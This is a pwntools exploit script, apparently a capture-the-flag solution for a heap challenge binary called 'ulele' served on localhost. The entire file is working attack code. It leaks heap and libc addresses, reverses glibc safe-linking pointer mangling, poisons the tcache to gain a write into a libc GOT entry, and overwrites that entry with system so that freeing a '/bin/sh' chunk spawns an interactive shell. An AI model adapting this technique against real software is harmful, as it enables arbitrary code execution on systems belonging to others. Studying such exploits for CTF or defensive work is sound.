from pwn import *
from sys import *

elf = context.binary = ELF("./ulele")
p = process("./ulele")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

HOST = 'localhost'
PORT = 1414

cmd = """
b*main
"""
if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)


def add(payload):
	p.sendlineafter(b'>> ', b'1')
	p.sendafter(b': ', payload)


def view(idx):
	p.sendlineafter(b'>> ', b'2')
	p.sendlineafter(b': ', str(idx).encode())



def delete(idx):
	p.sendlineafter(b'>> ', b'3')
	p.sendlineafter(b': ', str(idx).encode())


def defuscate(x,l=64):
	p = 0
	for i in range(l*4,0,-4): # 16 nibble
		v1 = (x & (0xf << i )) >> i
		v2 = (p & (0xf << i+12 )) >> i+12
		p |= (v1 ^ v2) << i
	return p

def obfuscate(p, adr):
	return p^(adr>>12)



for i in range(200):
	print(i)
	add(str(i).encode())

for i in range(10):
	add(b'A'*0x8) #200-209

for i in range(7):
	delete(i) #0-6

delete(0x107) #7
delete(0x108) #8
delete(7)

view(8)
p.recvuntil(b'Data: ')
heap = defuscate(u64(p.recvline().rstrip().ljust(8, b'\x00'))) - 0x12d00
print(hex(heap))


add(b'X'*8)

#fake chunk for later
payload = p64(0xdeadbeef)*11
payload += p64(0x71)
add(payload)

for i in range(5):
	add(b'/bin/sh\x00')

target = obfuscate(heap+0x12c50, heap+0x12bf0)
add(p64(target))
add(p64(target))
add(p64(target))

payload = p64(0x0)
payload += p64(0x21)
payload += p64(0x0)*3
payload += p64(0x461)

add(payload)
delete(210+256)

view(210)
p.recvuntil(b'Data: ')
leak = u64(p.recvline().rstrip().ljust(8, b'\x00'))
libc.address = leak - 0x1f6ce0
print(hex(leak), hex(libc.address))

add(b'/bin/sh\x00')
add(b'/bin/sh\x00')

#free_got = libc.address+0x665c28
free_got = libc.address+0x48ec28

target = obfuscate(free_got-8-0x40, heap+0x12bf0)

delete(100)
delete(221)
delete(220)

payload = p64(0x0)
payload += p64(0x21)
payload += p64(0x0)*3
payload += p64(0x21)
payload += p64(0x0)*3
payload += p64(0x71)
payload += p64(target)
add(payload)

add(b'dummy')

add(p64(libc.sym['system'])*12)

p.interactive()